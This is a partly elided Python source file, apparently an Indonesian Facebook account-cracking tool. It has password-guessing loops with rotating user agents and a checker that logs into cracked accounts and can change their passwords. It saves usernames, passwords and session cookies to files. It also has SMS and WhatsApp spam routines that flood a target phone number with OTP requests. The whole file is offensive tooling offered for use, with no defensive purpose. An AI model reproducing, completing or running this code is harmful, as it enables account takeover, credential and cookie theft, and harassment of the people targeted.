def reguler2(idf,pwv):
	...
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	prog.update(des,description=f"[bold green]B-Api[bold white] {loop}/{len(id)} OK-:[bold hot_pink]{ok}[/] CP-:[bold red]{cp}[/]")
	prog.advance(des) 
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
...
def kontol(idf,pwv):
	...
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	prog.update(des,description=f"[bold green]Async[bold white] {loop}/{len(id)} OK-:[bold hot_pink]{ok}[/] CP-:[bold red]{cp}[/]")
	prog.advance(des) 
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
...
def bapi(idf,pwv):
	...
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	prog.update(des,description=f"[bold green]M-Alpha[bold white] {loop}/{len(id)} OK-:[bold hot_pink]{ok}[/] CP-:[bold red]{cp}[/]")
	prog.advance(des) 
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
...
def colmek1(idf,pwv):
	...
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	prog.update(des,description=f"[bold green]X[bold white] {loop}/{len(id)} OK-:[bold hot_pink]{ok}[/] CP-:[bold red]{cp}[/]")
	prog.advance(des) 
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
...
def colmek2(idf,pwv):
	...
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	prog.update(des,description=f"[bold green]D[bold white] {loop}/{len(id)} OK-:[bold hot_pink]{ok}[/] CP-:[bold red]{cp}[/]")
	prog.advance(des) 
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
...
def file_cp():
	dirs = os.listdir('CP')
	Hujatanmu_Adalah_Kebodohanmu(Panel(f"""Copy Nama File Hasil Crack Di Bawah Ini Kemudian Pastekan Di Bawah Untuk Cek Opsi""",width=90,style=f"bold white"))
	for file in dirs:
		Hujatanmu_Adalah_Kebodohanmu(Panel(f"""{(file)}""",width=90,style=f"bold white"))
	try:
		Hujatanmu_Adalah_Kebodohanmu(Panel(f"""Copy Nama File Di Atas Kemudian Tempel Di Bawah Ini Contoh : {day}.txt""",width=90,style=f"bold white"))
		opsi()
	except IOError:
		Hujatanmu_Adalah_Kebodohanmu(Panel(f"""Tidak Ada File Untuk Di Cek Silahkan Crack Dulu""",width=90,style=f"bold white"))
		exit()
def opsi():
	CP = ("CP/")
	romi = console.input(f"  Tempelkan Pilihan : ")
	if romi == "":
		Hujatanmu_Adalah_Kebodohanmu(Panel(f"""  Isi Yang Benar""",width=90,style=f"bold white"))
		opsi()
	try:
		file_cp = open(CP+romi, "r").readlines()
	except IOError:
		exit(Hujatanmu_Adalah_Kebodohanmu(Panel(f"""Nama File {(romi)} Tidak Di Temukan""",width=90,style=f"bold white")))
	Hujatanmu_Adalah_Kebodohanmu(Panel(f"""Sebelum Melanjutkan Hidupkan Mode Pesawat Selama 10 Detik""",width=90,style=f"bold white"))
	pw=console.input(f"  Ubah Password Ketika Tab Yes y/n : ")
	if pw in['y','Y']:
		ubah_pass.append("ubah_sandi")
		pw2=console.input(f"  Masukan Password Baru : ")
		if len(pw2) <= 5:
			Hujatanmu_Adalah_Kebodohanmu(Panel(f"""Sandi Minimal 6 Karakter""",width=90,style=f"bold white"))
		else:
			pwbaru.append(pw2)
	Hujatanmu_Adalah_Kebodohanmu(Panel(f"""Total akun : {str(len(file_cp))}""",width=90,style=f"bold white"))
	nomor = 0
	for fb in file_cp:
		akun = fb.replace("\n","")
		ngecek  = akun.split("|")
		nomor+=1
		Hujatanmu_Adalah_Kebodohanmu(Panel(f"""[{(str(nomor))}] Cek Sesi Akun = {akun}""",width=90,style=f"bold white"));jeda(0.10)
		try:
		...
		if(len(cek)==0):
			if "Lihat detail login yang ditampilkan. Ini Anda?" in title:
				if "ubah_sandi" in ubah_pass:
					...
					Hujatanmu_Adalah_Kebodohanmu(tree)
					open('OK/OK-%s.txt' %(day), 'a').write("%s %s|%s|%s\n" % (H,user,pw,coki))
...
def scarpping_ua():    
    ...
    try:
        ...
        if response.status_code == 200:
            ...
            uascrap.append("Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36")
    except requests.exceptions.ConnectionError:
        uascrap.append("Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36")
...
def spam_sms():
	global nomor 
	Luciver_Xploit_Emang_Ganteng(panel(f'''   Masukan Nomor Target Yang Ingin Di Spam Contoh : +6281234567xxx''',width=90,padding=(0,8),style=f"bold white"))
...
class sxp_sms:
	...
	def main(self):
		...
		Luciver_Xploit_Emang_Ganteng(panel(f"Sukses Spam SMS Ke No : +62{nomor}",width=90,padding=(0,2),style=f"bold white"))   
def spam_wa():
	global nomor
	Luciver_Xploit_Emang_Ganteng(panel(f'''   Masukan Nomor Target Yang Ingin Di Spam Contoh : +6281234567xxx''',width=90,padding=(0,8),style=f"bold white"))
	nomor = input(f"  Input No Hp : +62").replace("+62","")
...
class sxp_wa:
	...
	def main(self):
		...
		self.wa_otp_5(nomor)
		self.wa_otp_6(nomor)
		Luciver_Xploit_Emang_Ganteng(panel(f" Sukses Spam WA Ke No : +62{nomor}",width=90,padding=(0,2),style=f"bold white"))
